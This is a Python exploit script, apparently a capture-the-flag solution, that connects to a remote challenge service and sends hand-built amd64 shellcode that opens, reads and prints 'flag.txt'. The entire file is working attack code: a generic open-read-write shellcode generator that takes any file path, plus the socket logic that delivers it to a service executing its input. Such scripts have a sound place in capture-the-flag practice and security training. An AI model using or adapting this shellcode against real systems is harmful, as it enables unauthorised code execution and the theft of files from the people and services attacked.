#!/usr/bin/env python3
import socket


HOST = "0.cloud.chals.io"
PORT = 34381


def orw_shellcode(path: bytes) -> bytes:
    """Build amd64 shellcode for open(path), read(fd), write(1)."""
    shellcode = bytearray(b"\x48\x31\xc0\x50")  # xor rax, rax; push rax
    encoded = path + b"\x00"
    encoded += b"\x00" * (-len(encoded) % 8)

    for offset in range(len(encoded) - 8, -1, -8):
        shellcode += b"\x48\xbb" + encoded[offset : offset + 8]  # mov rbx, chunk
        shellcode += b"\x53"  # push rbx

    shellcode += (
        b"\x48\x89\xe7"  # mov rdi, rsp
        b"\x48\x31\xf6"  # xor rsi, rsi
        b"\xb0\x02\x0f\x05"  # open(path, O_RDONLY)
        b"\x48\x89\xc7"  # mov rdi, rax
        b"\x48\x89\xe6"  # mov rsi, rsp
        b"\x31\xd2\xb2\x80"  # mov rdx, 0x80
        b"\x31\xc0\x0f\x05"  # read(fd, rsp, 0x80)
        b"\x48\x89\xc2"  # mov rdx, rax
        b"\xbf\x01\x00\x00\x00"  # mov edi, 1
        b"\xb0\x01\x0f\x05"  # write(1, rsp, bytes_read)
    )
    return bytes(shellcode)


def recv_until(sock: socket.socket, marker: bytes) -> bytes:
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return bytes(data)


def main() -> None:
    payload = orw_shellcode(b"flag.txt")
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        sock.settimeout(5)
        recv_until(sock, b"> ")
        # The service executes a line of shellcode after its input read returns.
        sock.sendall(payload + b"\n")

        output = bytearray()
        try:
            while chunk := sock.recv(4096):
                output += chunk
        except TimeoutError:
            pass
    print(output.decode("utf-8", "replace"), end="")


if __name__ == "__main__":
    main()
